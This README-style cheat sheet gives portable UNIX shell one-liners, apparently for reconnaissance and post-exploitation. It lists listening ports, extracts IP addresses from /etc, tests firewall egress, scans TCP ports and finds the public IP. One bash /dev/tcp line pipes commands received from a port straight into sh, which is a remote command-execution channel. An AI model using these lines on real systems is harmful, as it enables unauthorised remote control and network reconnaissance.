# lcdbins

An **lcdbin** is a lowest-common denominator binary; a platform-agnostic oneliner that should work on almost any UNIX environment.

## Universal Oneliners

Parse listening ports on /proc/net/tcp:

```shell
for i in $(awk -F "[ :]+" '{print $4}' /proc/net/tcp); do bc <<< "obase=10; ibase=16; $i"; done | sort -un
```

Get all IP addresses in /etc/:

```shell
grep -ro '[0-9]\{1,3\}\(\.[0-9]\{1,3\}\)\{3\}' /etc/* 2>/dev/null
grep -Ero '\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}\b' /etc/* 2>/dev/null
```

## /dev/tcp (requires bash)

Connect to a port and execute the command received:

```shell
exec 3<>/dev/tcp/127.0.0.1/31337; cat <&3 | sh
```

Use letmeoutofyour.net to check firewall ACLs for a port:

```shell
exec 3<>/dev/tcp/letmeoutofyour.net/31337; echo -e "GET / HTTP/1.0\r\n\r\n" >&3; cat <&3 | grep w00tw00t
```

Use dyndns.org to find your public IP address:

```shell
exec 3<>/dev/tcp/checkip.dyndns.org/80; echo -e "GET / HTTP/1.0\r\n\r\n" >&3; cat <&3
```

Scan TCP ports:

```shell
for i in {1..9000}; do SERVER="127.0.0.1"; PORT=$i; (echo  > /dev/tcp/$SERVER/$PORT) &> /dev/null && echo "Port $PORT seems to be open"; done
```
